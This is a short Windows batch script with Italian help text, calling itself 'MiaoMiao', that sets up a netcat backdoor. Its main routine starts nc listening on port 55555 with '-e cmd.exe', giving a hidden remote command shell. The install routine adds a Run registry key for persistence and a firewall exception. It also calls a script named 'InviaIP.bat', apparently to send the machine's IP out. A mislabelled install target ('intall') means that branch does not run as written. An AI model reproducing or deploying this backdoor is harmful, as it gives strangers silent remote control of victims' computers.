::Advanced interface to control the program: main + install + unistall

@echo off
set BAT_HOME=%~dp0
cd %BAT_HOME%
title MiaoMiao

if "%1"=="-i" GOTO install
if "%1"=="-u" GOTO unistall
if "%1"=="-?" GOTO help
if "%1"=="-help" GOTO help
cls

::main

call "InviaIP.bat"
start nc -l -p 55555 -e cmd.exe -L -d
exit
::---------------------------------------
:intall

taskkill.exe /f /im nc.exe
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v miaomiao /f
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v miaomiao /d "%ProgramFiles%\miaomiao\miaomiao.bat"
netsh firewall add allowedprogram program = "%BAT_HOME%nc.exe" name = NetCat mode =ENABLE
call "InviaIP.bat"
start nc -l -p 55555 -e cmd.exe -L -d
exit
::---------------------------------------
:unistall

taskkill.exe /f /im nc.exe
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v miaomiao /f
netsh firewall delete allowedprogram NetCat
del /s /f /q "%ProgramFiles%\miaomiao\*.*"
rd /s /q "%ProgramFiles%\miaomiao"
exit
::---------------------------------------
:help

echo MiaoMiao (netcat script):
echo.
echo Usa il parametro -i per installare lo script;
echo usa il parametro -u per disinstallare lo script;
echo usa il parametro -? o -help per visualizzare questa guida.
exit
::---------------------------------------
